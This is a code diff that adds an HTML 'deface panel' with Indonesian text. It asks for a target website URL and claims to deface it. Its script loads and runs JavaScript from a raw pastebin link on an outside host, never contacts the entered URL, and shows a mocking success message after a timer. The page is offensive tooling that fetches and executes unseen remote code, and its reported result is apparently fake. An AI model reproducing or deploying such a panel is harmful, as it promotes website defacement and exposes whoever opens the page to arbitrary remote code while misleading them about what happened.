@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HABZX Deface Panel</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #00ff00;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 50px;
+    }
+    h1 {
+      text-shadow: 0 0 10px #0f0;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px;
+      font-size: 16px;
+      border-radius: 5px;
+      border: none;
+      outline: none;
+    }
+    input {
+      width: 300px;
+      background: #111;
+      color: #0f0;
+    }
+    button {
+      background: #0f0;
+      color: #000;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #fff;
+      color: #000;
+    }
+    .log {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #ff0000;
+    }
+  </style>
+</head>
+<body>
+  <h1>💀 HABZX DEFACE PANEL 💀</h1>
+  <p>Masukkan link target website:</p>
+  <input type="text" id="target" placeholder="https://contoh.com">
+  <br>
+  <button onclick="deface()">DEFACE SEKARANG</button>
+
+  <div class="log" id="log"></div>
+
+  <script>
+    function deface() {
+      let url = document.getElementById('target').value;
+      if (!url) {
+        document.getElementById('log').innerText = "❌ Masukkan URL target terlebih dahulu!";
+        return;
+      }
+      document.getElementById('log').innerText = "⚡ Menjalankan script deface ke " + url + " ...";
+
+      let s = document.createElement('script');
+      s.type = "text/javascript";
+      s.src = "https://pastebin.com/raw/2xNGYq35";
+      document.body.appendChild(s);
+
+      setTimeout(() => {
+        document.getElementById('log').innerText = "✅ DONE BANG WEB AMPAS!";
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
